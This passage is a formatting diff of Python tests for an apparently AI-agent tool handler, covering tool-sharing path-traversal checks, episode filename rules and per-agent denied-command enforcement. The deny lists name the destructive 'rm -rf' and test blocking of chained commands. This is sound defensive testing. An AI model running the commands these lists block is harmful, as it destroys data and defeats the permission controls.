         common_dir.mkdir(parents=True, exist_ok=True)
         (common_dir / "my_tool.py").write_text("print('old')", encoding="utf-8")
 
-        memory.read_permissions.return_value = (
-            "## ツール作成\n- 共有ツール: yes"
-        )
+        memory.read_permissions.return_value = "## ツール作成\n- 共有ツール: yes"
 
         with patch("core.paths.get_data_dir", return_value=tmp_path):
             result = handler.handle("share_tool", {"tool_name": "my_tool"})
@@ -1517,7 +1653,9 @@ class TestShareTool:
         assert (common_dir / "my_tool.py").read_text(encoding="utf-8") == "print('old')"
 
     def test_path_traversal_in_tool_name_blocked(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle("share_tool", {"tool_name": "../../identity"})
         parsed = json.loads(result)
@@ -1525,7 +1663,9 @@ class TestShareTool:
         assert "valid Python identifier" in parsed["message"]
 
     def test_slash_in_tool_name_blocked(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle("share_tool", {"tool_name": "foo/bar"})
         parsed = json.loads(result)
@@ -1582,23 +1722,29 @@ class TestValidateEpisodePath:
 class TestEpisodeFilenameRegex:
     """Tests for _EPISODE_FILENAME_RE pattern."""
 
-    @pytest.mark.parametrize("filename", [
-        "2026-02-17.md",
-        "2026-01-01.md",
-        "2026-12-31_heartbeat.md",
-        "2026-02-17_cron_batch.md",
-        "2026-02-17_a.md",
-    ])
+    @pytest.mark.parametrize(
+        "filename",
+        [
+            "2026-02-17.md",
+            "2026-01-01.md",
+            "2026-12-31_heartbeat.md",
+            "2026-02-17_cron_batch.md",
+            "2026-02-17_a.md",
+        ],
+    )
     def test_valid_patterns(self, filename: str):
         assert _EPISODE_FILENAME_RE.match(filename)
 
-    @pytest.mark.parametrize("filename", [
-        "random_notes.md",
-        "2026-02-17",
-        "notes.txt",
-        "20260217.md",
-        "2026-2-17.md",
-    ])
+    @pytest.mark.parametrize(
+        "filename",
+        [
+            "random_notes.md",
+            "2026-02-17",
+            "notes.txt",
+            "20260217.md",
+            "2026-2-17.md",
+        ],
+    )
     def test_invalid_patterns(self, filename: str):
         assert not _EPISODE_FILENAME_RE.match(filename)
 
@@ -1610,7 +1756,9 @@ class TestWriteMemoryFileEpisodeWarning:
     """Tests for episode path warning in _handle_write_memory_file()."""
 
     def test_standard_episode_no_warning(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1620,7 +1768,9 @@ class TestWriteMemoryFileEpisodeWarning:
         assert "WARNING" not in result
 
     def test_suffixed_episode_no_warning(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1630,7 +1780,9 @@ class TestWriteMemoryFileEpisodeWarning:
         assert "WARNING" not in result
 
     def test_non_standard_episode_returns_warning(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1643,7 +1795,9 @@ class TestWriteMemoryFileEpisodeWarning:
         assert (anima_dir / "episodes" / "random_notes.md").exists()
 
     def test_non_episode_path_no_warning(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1653,7 +1807,9 @@ class TestWriteMemoryFileEpisodeWarning:
         assert "WARNING" not in result
 
     def test_warning_does_not_block_write(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         result = handler.handle(
             "write_memory_file",
@@ -1665,7 +1821,9 @@ class TestWriteMemoryFileEpisodeWarning:
         assert content == "important data"
 
     def test_warning_with_append_mode(
-        self, handler: ToolHandler, anima_dir: Path,
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
     ):
         (anima_dir / "episodes").mkdir(exist_ok=True)
         (anima_dir / "episodes" / "my_log.md").write_text("line1\n", encoding="utf-8")
@@ -1720,10 +1878,7 @@ class TestParseDeniedCommands:
         assert result == ["rm -rf", "システム設定の変更"]
 
     def test_section_ends_at_next_header(self, handler: ToolHandler):
-        perms = (
-            "## 実行できないコマンド\n- rm -rf\n"
-            "## コマンド実行\n- echo: OK"
-        )
+        perms = "## 実行できないコマンド\n- rm -rf\n## コマンド実行\n- echo: OK"
         result = handler._parse_denied_commands(perms)
         assert result == ["rm -rf"]
 
@@ -1739,7 +1894,9 @@ class TestDeniedCommandEnforcement:
     """Tests for Layer 2.5: per-anima denied command list enforcement."""
 
     def test_denied_command_blocked_list_format(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Commands in list-format denied section are blocked."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_LIST
@@ -1749,7 +1906,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_denied_command_blocked_comma_format(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Commands in comma-separated denied section are blocked."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
@@ -1759,7 +1918,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_denied_apt_get_blocked(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
         result = handler._check_command_permission("apt-get install vim")
@@ -1768,7 +1929,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_allowed_command_passes_with_denied_section(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Commands not in denied list are allowed normally."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_LIST
@@ -1776,7 +1939,9 @@ class TestDeniedCommandEnforcement:
         assert result is None
 
     def test_pipeline_denied_segment_blocked(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Pipeline with a denied command in any segment is blocked."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
@@ -1786,7 +1951,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_pipeline_all_allowed(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Pipeline where all segments are safe passes."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_LIST
@@ -1794,33 +1961,33 @@ class TestDeniedCommandEnforcement:
         assert result is None
 
     def test_natural_language_does_not_block_normal_commands(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Natural-language entries like 'システム設定の変更' don't block echo/ps."""
-        perms = (
-            "## 実行できるコマンド\n全般的なコマンド\n\n"
-            "## 実行できないコマンド\nシステム設定の変更"
-        )
+        perms = "## 実行できるコマンド\n全般的なコマンド\n\n## 実行できないコマンド\nシステム設定の変更"
         memory.read_permissions.return_value = perms
         assert handler._check_command_permission("echo hello") is None
         assert handler._check_command_permission("ps aux") is None
         assert handler._check_command_permission("ls -la") is None
 
     def test_no_denied_section_no_extra_blocking(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Without denied section, only hardcoded patterns block."""
         memory.read_permissions.return_value = "## コマンド実行\n全般的なコマンド"
         assert handler._check_command_permission("echo hello") is None
 
     def test_denied_wins_over_allowed(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Denied list (Layer 2.5) is checked before allowed list (Layer 4)."""
-        perms = (
-            "## 実行できるコマンド\n- docker: OK\n\n"
-            "## 実行できないコマンド\n- docker"
-        )
+        perms = "## 実行できるコマンド\n- docker: OK\n\n## 実行できないコマンド\n- docker"
         memory.read_permissions.return_value = perms
         result = handler._check_command_permission("docker run nginx")
         parsed = json.loads(result)
@@ -1828,7 +1995,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_hardcoded_blocklist_still_works(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Hardcoded _BLOCKED_CMD_PATTERNS still fires even without denied section."""
         memory.read_permissions.return_value = "## コマンド実行\n全般的なコマンド"
@@ -1837,7 +2006,9 @@ class TestDeniedCommandEnforcement:
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_execute_command_integration_denied(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Full integration: execute_command rejects per-anima denied command."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_LIST
@@ -1847,7 +2018,9 @@ class TestDeniedCommandEnforcement:
         assert "denied list" in parsed["message"]
 
     def test_execute_command_integration_allowed(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Full integration: execute_command allows non-denied command."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_LIST
@@ -1855,7 +2028,9 @@ class TestDeniedCommandEnforcement:
         assert "hello" in result
 
     def test_logical_and_denied_segment(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Logical && with a denied segment is blocked."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
@@ -1864,7 +2039,9 @@ class TestDeniedCommandEnforcement:
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_logical_or_denied_segment(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Logical || with a denied segment is blocked."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
@@ -1873,7 +2050,9 @@ class TestDeniedCommandEnforcement:
         assert parsed["error_type"] == "PermissionDenied"
 
     def test_empty_denied_section_no_blocking(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Empty denied section does not block anything extra."""
         perms = "## 実行できるコマンド\n全般的なコマンド\n\n## 実行できないコマンド\n## 別セクション"
@@ -1881,7 +2060,9 @@ class TestDeniedCommandEnforcement:
         assert handler._check_command_permission("echo hello") is None
 
     def test_hardcoded_and_denied_double_defense(
-        self, handler: ToolHandler, memory: MagicMock,
+        self,
+        handler: ToolHandler,
+        memory: MagicMock,
     ):
         """Both hardcoded and per-anima denied lists protect independently."""
         memory.read_permissions.return_value = PERMISSIONS_WITH_DENIED_COMMA
